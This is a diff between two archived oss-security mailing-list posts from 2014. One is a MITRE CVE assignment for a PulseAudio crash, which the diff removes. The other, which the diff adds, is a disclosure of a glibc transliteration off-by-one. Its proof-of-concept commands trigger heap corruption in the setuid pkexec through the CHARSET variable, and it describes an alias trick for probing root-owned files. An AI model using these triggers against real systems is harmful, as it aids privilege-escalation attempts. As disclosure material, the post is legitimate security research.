@@ -1,55 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/06/04/16
-Message-Id: <201406041530.s54FUhnr013481@linus.mitre.org>
-Date: Wed, 4 Jun 2014 11:30:43 -0400 (EDT)
-From: cve-assign@...re.org
-To: patrakov@...il.com
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE request: PulseAudio crash due to empty UDP packet
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/07/14/1
+Message-ID: <mpro.n8oiuc0ushvds06jd.taviso@cmpxchg8b.com>
+Date: Sun, 13 Jul 2014 18:59:01 -0700
+From: Tavis Ormandy <taviso@...xchg8b.com>
+To: oss-security@...ts.openwall.com
+Subject: glibc locale issues
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+I just remembered another charset issues I had looked into but abandoned.
 
-> If one has module-rtp-recv loaded into PulseAudio, then a remote
-> attacker can crash this instance of PulseAudio by sending an empty UDP
-> packet
+First of all, I think the need_so logic in gconv_trans is broken, but even
+if it worked there is an off by one error in __gconv_translit_find() (it
+does + 3 instead of + 3 + 1 in the allocation. 
 
-> memblock.c: Assertion 'b' failed
+Proof:
 
-Use CVE-2014-3970.
+$ CHARSET=//ABCDE pkexec 
+*** Error in `pkexec': malloc(): memory corruption: 0x00007f15bc0732d0 ***
+*** Error in `pkexec': malloc(): memory corruption: 0x00007f15bc0732d0 ***
+$ cp $(which pkexec) .
+$ CHARSET=//ABCDE valgrind --quiet ./pkexec 
+==23804== Invalid write of size 4
+==23804==    at 0x5A2D34B: __gconv_translit_find (gconv_trans.c:392)
+==23804==    by 0x5A24B1B: __gconv_open (gconv_open.c:182)
+==23804==    by 0x5A24671: iconv_open (iconv_open.c:71)
+==23804==    by 0x54E5298: try_conversion (gconvert.c:199)
+==23804==    by 0x54E583C: g_iconv_open (gconvert.c:251)
+==23804==    by 0x54E58F5: open_converter (gconvert.c:338)
+==23804==    by 0x54E5D17: g_convert (gconvert.c:575)
+==23804==    by 0x54E5EC6: g_convert_with_fallback (gconvert.c:671)
+==23804==    by 0x5508BDD: strdup_convert (gmessages.c:688)
+==23804==    by 0x5509EBC: g_printerr (gmessages.c:1542)
+==23804==    by 0x10A55C: main (pkexec.c:515)
+==23804==  Address 0x7ca8cf5 is 117 bytes inside a block of size 120 alloc'd
+==23804==    at 0x4A0645D: malloc (in
+/usr/lib64/valgrind/vgpreload_memcheck-amd64-linux.so)
+==23804==    by 0x5A2D268: __gconv_translit_find (gconv_trans.c:369)
+==23804==    by 0x5A24B1B: __gconv_open (gconv_open.c:182)
+==23804==    by 0x5A24671: iconv_open (iconv_open.c:71)
+==23804==    by 0x54E5298: try_conversion (gconvert.c:199)
+==23804==    by 0x54E583C: g_iconv_open (gconvert.c:251)
+==23804==    by 0x54E58F5: open_converter (gconvert.c:338)
+==23804==    by 0x54E5D17: g_convert (gconvert.c:575)
+==23804==    by 0x54E5EC6: g_convert_with_fallback (gconvert.c:671)
+==23804==    by 0x5508BDD: strdup_convert (gmessages.c:688)
+==23804==    by 0x5509EBC: g_printerr (gmessages.c:1542)
+==23804==    by 0x10A55C: main (pkexec.c:515)
+==23804== 
+
+I think this //foo syntax is supposed to allow you to open converters in
+/usr/lib/gconv, but because the need_so logic is broken it doesn't work. If
+it did, there would be another bug but I can't reach it right now.
+
+Unrelated to glibc, but because pkexec links to glib, the built-in
+iconv/gconv conversion stuff is used by default. This allows you to setup
+aliases, which are of the form "charset <arbitrary alias>", for example:
 
 
-> PulseAudio usually gets respawned anyway.
+$ echo "UTF-7 ThisIsAnAlias" > charset.alias
+$ CHARSET=ThisIsAnAlias CHARSETALIASDIR=$(pwd) pkexec 
+pkexec --version +AHw
+       --help +AHw
+       --disable-internal-agent +AHw
+       +AFs---user username+AF0 PROGRAM +AFs-ARGUMENTS...+AF0
 
-Apparently there are realistic circumstances in which respawning
-doesn't happen (possibly a zero value of conf->daemonize or the
-"User-configured server at %s, refusing to start/autospawn." case in
-http://cgit.freedesktop.org/pulseaudio/pulseaudio/tree/src/daemon/main.c).
+(Notice the output is in UTF-7). I guess you can use this to figure out the
+contents of root owned files (via hard links or symlinks), but it has to be
+in the right format, and you have to guess the contents. Even then, you will
+just receive confirmation if you guess right.
 
+This seems like a pretty minor flaw that I wouldn't normally bother
+mentioning, but as I'm tacking it onto a more serious bug and we're all
+discussing the LC_ALL thing anyway I don't mind so much ;-) Maybe someone
+can figure out how to turn this into something scary.
 
-> http://lists.freedesktop.org/archives/pulseaudio-discuss/2014-May/020740.html
+Tavis.
 
-> expecting to find an infinite loop (as it would be common for such
-> FIONREAD misuse), but found an assertion failure instead. So there may
-> be two bugs.
-
-The scope of CVE-2014-3970 does not include any infinite loop that
-might be discovered later.
-
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
-
-iQEcBAEBAgAGBQJTjztGAAoJEKllVAevmvmspWYIAMDODhaMo0EfkzPHhhmadz1H
-B1wYGv+h7cvW3/acKVpvdE+oIcHS9I2rbzSuPlgAtAghAc+HNQFS4/QSNtvFfBo9
-9AgbvUgsCYiF5uNcylnmK80P5f4QpxZ+n7lBqu75uveZV3EsitqKiS5W3qQ3Ef3i
-GaIAYwpvtXLPq/GSdEv/UznmnOVqaTK4hwvqfyePgSfIEMdcED0GgeDGo8D/NLEL
-XSYfDJbVgi5ry8YQcS4Q5nJtpTfBQS6knlcKPMqYB7KtvUesOECLC9hrv9jYYJga
-XORzNGRP9tWJspn05rc9NlmAegurGeOUStaE/2q3PDA53gEWKhH4JwhzISfMmOQ=
-=3Sw2
------END PGP SIGNATURE-----
